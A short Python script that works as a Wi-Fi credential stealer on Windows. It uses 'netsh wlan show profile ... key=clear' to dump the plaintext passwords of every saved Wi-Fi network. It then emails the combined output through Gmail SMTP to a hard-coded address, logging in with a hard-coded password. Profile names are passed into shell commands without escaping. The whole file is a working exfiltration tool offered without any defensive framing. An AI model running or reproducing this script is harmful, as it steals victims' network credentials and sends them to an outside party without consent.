#!/usr/bin/env python3

import subprocess
import smtplib
import re

def CommandExecute(cmd):
    #
    #subprocess.Popen(cmd, shell=True)
    #
    result = subprocess.check_output(cmd,shell=True)
    #
    return result


def SendMail(email,password,message):
    #
    server = smtplib.SMTP("smtp.gmail.com",587)
    #
    server.starttls()
    #
    server.login(email, password)
    #
    server.sendmail(email, email, message)
    #
    server.quit()

def main():
    #
    command = "netsh wlan show profile"
    #
    networks = CommandExecute(command).decode('utf-8')
    #
    net_names = re.findall("(?:Profile\s*:\s)(.*)",networks)
    #
    result=""
    #
    for n in net_names:
        #
        command = "netsh wlan show profile "+n+" key=clear"
        #
        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
        #
        result = result + current_result
        #

    #
    SendMail("wolfgang.m.jager@gmail.com","deathanddestruction",result)

if(__name__ == '__main__'):
    #
    main()
